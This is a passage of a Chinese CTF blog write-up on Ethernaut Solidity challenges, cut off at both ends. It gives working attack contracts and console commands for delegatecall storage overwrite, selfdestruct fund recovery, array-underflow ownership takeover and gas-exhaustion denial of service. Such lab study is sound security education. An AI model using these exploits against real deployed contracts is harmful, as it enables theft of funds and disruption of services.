storedTime;</span><br><span class="line">  <span class="comment">// Sets the function signature for delegatecall</span></span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(<span class="string">&quot;setTime(uint256)&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params">address _timeZone1LibraryAddress, address _timeZone2LibraryAddress</span>) <span class="title">public</span> &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// set the time for timezone 1</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setFirstTime</span>(<span class="params">uint _timeStamp</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the time for timezone 2</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setSecondTime</span>(<span class="params">uint _timeStamp</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simple library contract to set the time</span></span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// stores a timestamp </span></span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setTime</span>(<span class="params">uint _time</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>delegateCall函数</p>
<p>区别在于 <code>delegatecall</code> 仅使用给定地址的代码，其它信息则使用当前合约(如存储，余额等等)。<code>delegateCall</code> 方法仅仅使用目标合约的代码， 其余的 <code>storage</code> 等数据均使用自己的，这就使得某些访存操作会错误的处理对象</p>
<p>看到一个师傅分析的例子</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract A&#123;</span><br><span class="line">    uint public x1;</span><br><span class="line">    uint public x2;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">funca</span>(<span class="params">address param</span>)</span>&#123;</span><br><span class="line">        param.delegatecall(bytes4(keccak256(<span class="string">&quot;funcb()&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract B&#123;</span><br><span class="line">    uint public y1;</span><br><span class="line">    uint public y2;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">funcb</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        y1=<span class="number">1</span>;</span><br><span class="line">        y2=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上述合约中，一旦在a中调用了b的funcb函数，那么对应的a中 x1就会等于y1，x2就会等于 2。   在这个过程中实际b合约的funcb函数把storage里面的slot 1的值更换为了1，把slot 2的值更换为了  2，那么由于delegatecall的原因这里修改的是a的storage，对应就是修改了 x1，x2。可以实现变量覆盖</p>
<p>那么这个题就很好办了，我们调用Preservation的setFirstTime函数时候实际通过delegatecall  执行了LibraryContract的setTime函数，修改了slot 1，也就是修改了timeZone1Library变量。  这样，我们第一次调用setFirstTime将timeZone1Library变量修改为我们的恶意合约的地址，第二次调用setFirstTime就可以执行我们的任意代码了。</p>
<figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">contract attack &#123;</span><br><span class="line">    address <span class="keyword">public</span> timeZone1Library;</span><br><span class="line">    address <span class="keyword">public</span> timeZone2Library;</span><br><span class="line">    address <span class="keyword">public</span> owner;</span><br><span class="line">    </span><br><span class="line">    address instance_address = <span class="number">0x7cec052e622c0fb68ca3b2e3c899b8bf8b78663c</span>; <span class="comment">// </span></span><br><span class="line">    Preservation target = Preservation(instance_address);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        target.setFirstTime(<span class="keyword">uint</span>(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        target.setFirstTime(<span class="keyword">uint</span>(<span class="number">0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2</span>)); <span class="comment">//player</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setTime</span><span class="params">(<span class="keyword">uint</span> _time)</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">        timeZone1Library = address(_time);</span><br><span class="line">        timeZone2Library = address(_time);</span><br><span class="line">        owner = address(_time);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210623204943777-7093025.png" alt="image-20210623204943777"></p>
<h2 id="0x12-Recovery"><a href="#0x12-Recovery" class="headerlink" title="0x12 Recovery"></a>0x12 Recovery</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//generate tokens</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">generateToken</span>(<span class="params">string memory _name, uint256 _initialSupply</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">new</span> SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  <span class="comment">// public variables</span></span><br><span class="line">  string public name;</span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// constructor</span></span><br><span class="line">  <span class="title">constructor</span>(<span class="params">string memory _name, address _creator, uint256 _initialSupply</span>) <span class="title">public</span> &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// collect ether in return for tokens</span></span><br><span class="line">  fallback() external payable &#123;</span><br><span class="line">    balances[msg.sender] = msg.value.mul(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// allow transfers of tokens</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint _amount</span>) <span class="title">public</span> </span>&#123; </span><br><span class="line">    <span class="built_in">require</span>(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] = balances[msg.sender].sub(_amount);</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// clean up after ourselves</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params">address payable _to</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>要求我们移除，或转移指定合约上面的钱，其实简单来说就是已知一个 <code>Recovery</code> 合约地址，恢复一下它创建的 <code>SimpleToken</code> 地址，然后将 <code>0.5 eth</code> 从丢失地址的合约中提出即可</p>
<p>在metamask上拿到交易hash，再去浏览器上面查询</p>
<p><img src="/2021/06/17/16/image-20210624112151430-7093025.png" alt="image-20210624112151430"></p>
<p>从而得到丢失合约的地址，就可编写poc</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.23</span>;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// public variables</span></span><br><span class="line">  string public name;</span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// collect ether in return for tokens</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// allow transfers of tokens</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint _amount</span>) <span class="title">public</span> </span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// clean up after ourselves</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params">address _to</span>) <span class="title">public</span> </span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract RecoveryPoc &#123;</span><br><span class="line">    SimpleToken target;</span><br><span class="line">    <span class="title">constructor</span>(<span class="params">address _addr</span>) <span class="title">public</span>&#123;</span><br><span class="line">        target = SimpleToken(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        target.destroy(tx.origin);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210624113103217-7093025.png" alt="image-20210624113103217"></p>
<h2 id="0x13-MagicNumber"><a href="#0x13-MagicNumber" class="headerlink" title="0x13 MagicNumber"></a>0x13 MagicNumber</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setSolver</span>(<span class="params">address _solver</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    solver = _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ____________/\\\_______/\\\\\\\\\_____        </span></span><br><span class="line"><span class="comment">     __________/\\\\\_____/\\\///////\\\___       </span></span><br><span class="line"><span class="comment">      ________/\\\/\\\____\///______\//\\\__      </span></span><br><span class="line"><span class="comment">       ______/\\\/\/\\\______________/\\\/___     </span></span><br><span class="line"><span class="comment">        ____/\\\/__\/\\\___________/\\\//_____    </span></span><br><span class="line"><span class="comment">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span></span><br><span class="line"><span class="comment">          _\///////////\\\//____/\\\/___________  </span></span><br><span class="line"><span class="comment">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span></span><br><span class="line"><span class="comment">            ___________\///_____\///////////////__</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://hitcxy.com/2019/ethernaut/">参考</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bytecode = <span class="string">&quot;0x600a600c600039600a6000f3602a60805260206080f3&quot;</span>;</span><br><span class="line">web3.eth.sendTransaction(&#123;<span class="attr">from</span>:player,<span class="attr">data</span>:bytecode&#125;)</span><br><span class="line"><span class="keyword">await</span> contract.setSolver(<span class="string">&#x27;address&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210625202119077-7093025.png" alt="image-20210625202119077"></p>
<h2 id="0x14-Alien-Codex"><a href="#0x14-Alien-Codex" class="headerlink" title="0x14 Alien Codex"></a>0x14 Alien Codex</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;../helpers/Ownable-05.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier <span class="function"><span class="title">contacted</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    assert(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">make_contact</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    contact = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">record</span>(<span class="params">bytes32 _content</span>) <span class="title">contacted</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">  	codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">retract</span>(<span class="params"></span>) <span class="title">contacted</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">    codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">revise</span>(<span class="params">uint i, bytes32 _content</span>) <span class="title">contacted</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>合约开头引入了<a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/ethernaut/tree/master/contracts/helpers">Ownable合约</a>，同时也引入了一个 <code>owner</code> 变量</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="number">0</span>, <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;<span class="built_in">console</span>.info(y)&#125;);</span><br><span class="line"><span class="comment">// 0x00000000000000000000000073048cec9010e92c298b016966bde1cc47299df5 slot0</span></span><br><span class="line"><span class="comment">// 对应的 contact 为零,Owner=0x73048cec9010e92c298b016966bde1cc47299df5</span></span><br></pre></td></tr></table></figure>
<p>codex储存的位置是从slot1同时这里也是储存数组长度的地方，而 codex 的实际内容存储在 <code>keccak256(bytes32(1))</code> 开始的位置，EVM的储存方式是</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array[array_slot_index] == SLOAD(keccak256(slot(array)) + slot_index)</span><br><span class="line">codex[<span class="number">0</span>] =eb3.eth.getStorageAt(contract.address,keccak_256(byte32(<span class="number">1</span>)) <span class="comment">//byte32用于填充0</span></span><br><span class="line"><span class="comment">//下面暂且记作slotx</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210626155940718-7093025.png" alt></p>
<p>也就是说我们对codex[0]进行偏移，就能得到codex[y]=slot0，也就能达到修改slot0的目的</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">y</span>=<span class="number">2</span>^<span class="number">256</span>-x+<span class="number">0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.revise(<span class="string">&#x27;0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a&#x27;</span>,<span class="string">&#x27;0x000000000000000000000001e510Ac7b174D055679d38450c42AD07bC65E0bc9&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>但是再次之前，我们需要绕过修饰关键词contacted的限制，也就是需要使contact = true，那就是调用make_contact() 函数，此时我们想要读取到codex[y]，slot1存储的数组长度大于y，很显然 retract()函数能帮助我们进行下溢。record或者也可以一直调用record，在第y次时传入正确的参数</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">contract.retract()</span><br><span class="line"><span class="regexp">//</span> codex.length--</span><br><span class="line">await web3.eth.getStorageAt(contract.address, <span class="number">1</span>)</span><br><span class="line"><span class="regexp">//</span> codex.length</span><br><span class="line"><span class="regexp">//</span> <span class="number">0</span>xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span><br><span class="line">await contract.owner()</span><br><span class="line"><span class="regexp">//</span> <span class="string">&quot;0x73048cec9010e92c298b016966bde1cc47299df5&quot;</span></span><br><span class="line">contract.revise(<span class="string">&#x27;0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a&#x27;</span>,<span class="string">&quot;0x000000000000000000000001+Player address&quot;</span>)</span><br><span class="line"><span class="regexp">//</span> 调用 revise()</span><br><span class="line">await contract.owner()</span><br><span class="line"><span class="regexp">//</span> Player address</span><br><span class="line"><span class="regexp">//</span> Submit instance</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210626142522049-7093025.png" alt="image-20210626142522049"></p>
<h2 id="0x15-Denial"><a href="#0x15-Denial" class="headerlink" title="0x15 Denial"></a>0x15 Denial</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">using</span> SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">    address <span class="built_in">public</span> partner; // withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address payable <span class="built_in">public</span> <span class="keyword">constant</span> owner = address(<span class="number">0xA9E</span>);</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    <span class="keyword">mapping</span>(address =&gt; uint) withdrawPartnerBalances; // keep track <span class="keyword">of</span> partners balances</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> setWithdrawPartner(address _partner) <span class="built_in">public</span> &#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // withdraw <span class="number">1</span>% <span class="keyword">to</span> recipient <span class="keyword">and</span> <span class="number">1</span>% <span class="keyword">to</span> <span class="keyword">owner</span></span><br><span class="line">    <span class="keyword">function</span> withdraw() <span class="built_in">public</span> &#123;</span><br><span class="line">        uint amountToSend = address(this).balance.div(<span class="number">100</span>);</span><br><span class="line">        // <span class="keyword">perform</span> a <span class="keyword">call</span> <span class="keyword">without</span> checking <span class="keyword">return</span></span><br><span class="line">        // The recipient can revert, the <span class="keyword">owner</span> will still <span class="keyword">get</span> their <span class="keyword">share</span></span><br><span class="line">        partner.<span class="keyword">call</span>.<span class="keyword">value</span>(amountToSend)(&quot;&quot;);</span><br><span class="line">        <span class="keyword">owner</span>.transfer(amountToSend);</span><br><span class="line">        // keep track <span class="keyword">of</span> last withdrawal <span class="type">time</span></span><br><span class="line">        timeLastWithdrawn = now;</span><br><span class="line">        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].<span class="keyword">add</span>(amountToSend);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow deposit <span class="keyword">of</span> funds</span><br><span class="line">    fallback() <span class="keyword">external</span> payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // convenience <span class="keyword">function</span></span><br><span class="line">    <span class="keyword">function</span> contractBalance() <span class="built_in">public</span> <span class="keyword">view</span> <span class="keyword">returns</span> (uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要求我们让其他人无法提款。分析一下合约</p>
<p>从合约的代码中我们很容易发现这里存在一个重入漏洞，所以可以通过部署了一个利用重入漏洞的合约，把gas直接消耗光，那么owner 自然收不到钱了，从而造成DOS。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    address instance_address = instance_address_here;</span><br><span class="line">    Denial target = Denial(instance_address);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        target.setWithdrawPartner(address(<span class="built_in">this</span>));</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">payable</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或者assert 函数触发异常之后会消耗所有可用的 gas，消耗了所有的 gas 那就没法转账了</p>
<figure class="highlight irpf90"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    address instance_address = instance_address_here;</span><br><span class="line">    Denial <span class="keyword">target</span> = Denial(instance_address);</span><br><span class="line">    <span class="function"><span class="keyword">function</span></span> hack() <span class="keyword">public</span> &#123;</span><br><span class="line">        <span class="keyword">target</span>.setWithdrawPartner(address(this));</span><br><span class="line">        <span class="keyword">target</span>.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span></span> () payable <span class="keyword">public</span> &#123;</span><br><span class="line">        <span class="keyword">assert</span>(<span class="number">0</span>==<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210626164122137-7093025.png" alt="image-20210626164122137"></p>
<h2 id="0x16-Shop"><a href="#0x16-Shop" class="headerlink" title="0x16 Shop"></a>0x16 Shop</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">price</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">  uint public price = <span class="number">100</span>;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_buyer.price.gas(<span class="number">3000</span>)() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = <span class="literal">true</span>;</span><br><span class="line">      price = _buyer.price.gas(<span 